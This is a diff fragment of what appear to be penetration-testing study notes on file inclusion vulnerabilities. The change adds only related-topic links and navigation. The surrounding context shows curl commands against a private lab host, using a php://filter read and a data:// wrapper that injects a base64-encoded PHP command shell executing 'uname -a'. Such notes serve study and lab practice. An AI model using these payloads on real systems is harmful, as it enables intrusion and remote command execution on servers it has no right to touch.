@@ -289,3 +289,14 @@ curl http://192.168.158.16/meteor/index.php?page=php://filter/convert.base64-enc
 curl "http://192.168.158.16/meteor/index.php?page=
 
 ## data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a"
+
+---
+%% graph-links %%
+## Related
+- [[Local file inclusion (LFI)]]
+- [[Remote file inclusion (RFI)]]
+- [[Command Injection]]
+
+> [!info] Navigation
+> Section: [[Web Applications/Common Web Application Attacks/File Inclusion Vulnerabilities/_index|File Inclusion Vulnerabilities]] · Home: [[🏠 Home]]
+
